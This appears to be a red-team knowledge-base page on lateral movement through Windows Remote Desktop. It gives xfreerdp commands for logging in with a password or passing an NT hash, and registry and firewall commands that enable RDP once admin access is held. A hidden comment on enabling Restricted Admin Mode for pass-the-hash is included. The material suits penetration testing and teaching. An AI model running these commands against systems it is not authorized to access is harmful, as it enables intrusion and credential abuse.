---
label: RDP
---

# Remote Desktop Protocol (RDP)

> **Requirements**:
>
> * Credentials (password, NT hash, Kerberos TGT) of a member of the local **Administrators** or **Remote Desktop Users** group on the target machine.
> * RDP enabled on the target machine (disabled by default on both Server and Client Windows).

**RDP (3389/TCP) is not active by default**. It must be explicitly enabled. By default, if you want to connect via RDP, you need to be a **local administrator** or a member of local **Remote Desktop Users** group on the target machine. Logon via RDP is of the **Remote Interactive type** (reusable credentials are available).

{/*
<!-- TODO: 
    You can pass the hash using xfreerdp.  There is one important caveat however. This is only possible when the system has Restricted Admin Mode enabled. If this is not enabled and you try to PTH, you will get an error stating that “Account Restrictions are preventing this user from signing in.”  Restricted Admin Mode is disabled by default. The good news is, if you have any level of admin access to the system and access to SMB/WinRM/etc, you can enable this feature remotely. -->
*/}

Linux:

```bash
# Using password
xfreerdp /u:$user /p:$password /v:$host /d:$domain

# Using NT hash
xfreerdp /u:$user /pth:$nt_hash /v:$host /d:$domain
```

Windows:

```powershell
# Open RDP connection dialog (target user's password is required)
mstsc
```

{/*
<!-- Restricted Admin mode for RDP, https://learn.microsoft.com/en-us/archive/blogs/kfalde/restricted-admin-mode-for-rdp-in-windows-8-1-2012-r2 -->
*/}

## Enable RDP with CMD

> **NOTE**: Windows Home doesn't have built-in RDP server. It's available on Windows Server, Pro and Enterprise editions.

If you have administrative access to the machine (e.g. via SmbExec or WinRM) you can activate RDP using CMD:

```powershell
# Enable RDP service
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Allow RDP on firewall
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

## References

* [Kali.org, _Passing the Hash with Remote Desktop_](https://www.kali.org/blog/passing-hash-remote-desktop/)
